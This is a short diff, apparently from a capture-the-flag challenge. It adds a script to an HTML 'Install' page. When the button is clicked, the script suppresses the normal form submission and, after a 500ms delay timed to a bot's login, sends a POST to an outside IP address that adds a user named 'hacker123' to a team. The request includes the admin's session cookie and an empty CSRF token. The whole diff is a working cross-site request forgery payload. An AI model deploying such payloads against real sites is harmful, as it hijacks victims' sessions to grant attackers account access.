@@ -5,5 +5,20 @@
     <input type="hidden" name="csrfToken" id="csrfTokenInput" value="">
     <input type="submit" id="installbutton" value="Install">
   </form>
+  <script>
+    document.getElementById('installbutton').addEventListener('click', (event) => {
+      event.preventDefault(); // Prevent default form submission
+      setTimeout(() => {
+        fetch('http://52.47.161.102:3000/api/teams/1/addUser/hacker123', {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/x-www-form-urlencoded'
+          },
+          body: 'csrfToken=',
+          credentials: 'include' // Include admin's session cookie
+        }).catch(err => console.error('Fetch Error:', err.message));
+      }, 500); // 500ms delay to align with bot's login
+    });
+  </script>
 </body>
 </html>
